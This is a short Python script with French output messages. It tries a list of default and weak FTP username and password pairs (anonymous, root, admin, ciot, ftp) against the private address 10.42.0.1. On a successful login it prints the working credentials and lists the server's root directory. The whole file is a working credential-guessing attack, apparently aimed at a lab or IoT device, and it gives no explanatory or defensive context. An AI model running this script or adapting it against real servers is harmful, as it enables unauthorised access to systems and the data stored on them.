import ftplib

HOST = "10.42.0.1"
credentials = [
    ("anonymous", ""),
    ("anonymous", "anonymous"),
    ("root", "123456789"),
    ("root", ""),
    ("admin", "admin"),
    ("ciot", "ciot"),
    ("ftp", "ftp"),
]

for user, pwd in credentials:
    try:
        ftp = ftplib.FTP(HOST, timeout=5)
        ftp.login(user, pwd)
        print(f"[OK] FTP connecté : {user}:{pwd}")
        print("Contenu racine :")
        ftp.retrlines('LIST')
        ftp.quit()
        break
    except ftplib.error_perm as e:
        print(f"[FAIL] {user}:{pwd} → {e}")
    except Exception as e:
        print(f"[ERR] {e}")